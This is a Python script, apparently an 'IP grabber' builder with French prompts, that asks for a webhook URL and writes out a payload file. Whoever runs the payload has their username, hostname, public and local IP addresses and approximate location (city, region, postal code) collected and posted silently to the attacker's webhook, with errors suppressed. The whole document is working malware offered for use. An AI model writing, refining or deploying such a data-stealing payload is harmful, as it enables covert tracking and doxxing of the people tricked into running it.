import time

BLUE = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"
RED = "\033[31m"
GREEN = "\033[32m"

ascii_art = """
'####:'########::::::'######:::'########:::::'####::::'########::'########::'########::
. ##:: ##.... ##::::'##... ##:: ##.... ##:::'## ##::: ##.... ##: ##.... ##: ##.....:: ##.... ##:
: ##:: ##:::: ##:::: ##:::..::: ##:::: ##::'##:. ##:: ##:::: ##: ##:::: ##: ##:::::: ##:::: ##:
: ##:: ########::::: ##::'####: ########::'##:::. ##: ########:: ########:: ########::
: ##:: ##.....:::::: ##::: ##:: ##.. ##::: #########: ##.... ##: ##.... ##: ##...:::: ##.. ##::
: ##:: ##::::::::::: ##::: ##:: ##::. ##:: ##.... ##: ##:::: ##: ##:::: ##: ##::::::: ##::. ##::
'####: ##:::::::::::. ######::: ##:::. ##: ##:::: ##: ########:: ########: ########: ##:::. ##:
....::..:::::::::::::......::::::..::::::..::::::..::........:::........:::........::::..:::::..::
"""

def rainbow_colors(n):
    base_colors = [
        (255, 0, 0),
        (255, 127, 0),
        (255, 255, 0),
        (0, 255, 0),
        (0, 0, 255),
        (75, 0, 130),
        (148, 0, 211),
    ]
    result = []
    segments = len(base_colors) - 1
    seg_len = n / segments
    for i in range(n):
        seg = int(i // seg_len)
        t = (i % seg_len) / seg_len
        if seg >= segments:
            seg = segments - 1
            t = 1
        c1 = base_colors[seg]
        c2 = base_colors[seg + 1]
        r = int(c1[0] + (c2[0] - c1[0]) * t)
        g = int(c1[1] + (c2[1] - c1[1]) * t)
        b = int(c1[2] + (c2[2] - c1[2]) * t)
        result.append((r, g, b))
    return result

def rgb_to_ansi(r, g, b):
    return f"\033[38;2;{r};{g};{b}m"

def print_rainbow(text):
    lines = text.strip('\n').split('\n')
    colors = rainbow_colors(len(lines))
    for i, line in enumerate(lines):
        r, g, b = colors[i]
        print(rgb_to_ansi(r, g, b) + line + RESET)
        time.sleep(0.03)

def main():
    print_rainbow(ascii_art)
    webhook = input(f"{BLUE}🧪 {RESET}Entre ton webhook : ").strip()
    filename = input(f"{BLUE}📝 {RESET}Name Files : ").strip()
    if not filename.endswith(".py"):
        filename += ".py"

    print(f"\n{GREEN}🛠️  Génération du fichier {filename}{RESET}")
    time.sleep(1)

    payload_code = f'''import socket
import getpass
import requests

webhook = "{webhook}"

def get_public_ip():
    try:
        return requests.get("https://api.ipify.org").text
    except:
        return "N/A"

def get_geo_info(ip):
    try:
        r = requests.get(f"https://ipinfo.io/{{ip}}/json")
        data = r.json()
        return {{
            "country": data.get("country", "N/A"),
            "region": data.get("region", "N/A"),
            "city": data.get("city", "N/A"),
            "postal": data.get("postal", "N/A"),
        }}
    except:
        return {{"country": "N/A", "region": "N/A", "city": "N/A", "postal": "N/A"}}

def send_webhook(description):
    embed = {{
        "title": "🧠 Informations de l'appareil",
        "description": description,
        "color": 0xFF0000,
        "footer": {{"text": "📡 Payload exécuté"}}
    }}
    try:
        requests.post(webhook, json={{"embeds": [embed]}})
    except:
        pass

def main():
    hostname = socket.gethostname()
    username = getpass.getuser()
    displayname = username

    ip_public = get_public_ip()
    try:
        ip_local = socket.gethostbyname(hostname)
    except:
        ip_local = "N/A"

    geo = get_geo_info(ip_public)

    info_text = f"""🖥️ Système
Utilisateur : {{username}}
Hostname   : {{hostname}}
Session    : {{displayname}}

🌐 Réseau
IP Publique : {{ip_public}}
IP Locale   : {{ip_local}}

📍 Localisation
Pays        : {{geo['country']}}
Ville       : {{geo['city']}}
Région      : {{geo['region']}}
Code Postal : {{geo['postal']}}
"""

    send_webhook(info_text)

if __name__ == "__main__":
    main()
'''

    with open(filename, "w", encoding="utf-8") as f:
        f.write(payload_code)

    print(f"\n{GREEN}✅ Fichier '{filename}' généré avec succès !{RESET}")

if __name__ == "__main__":
    main()
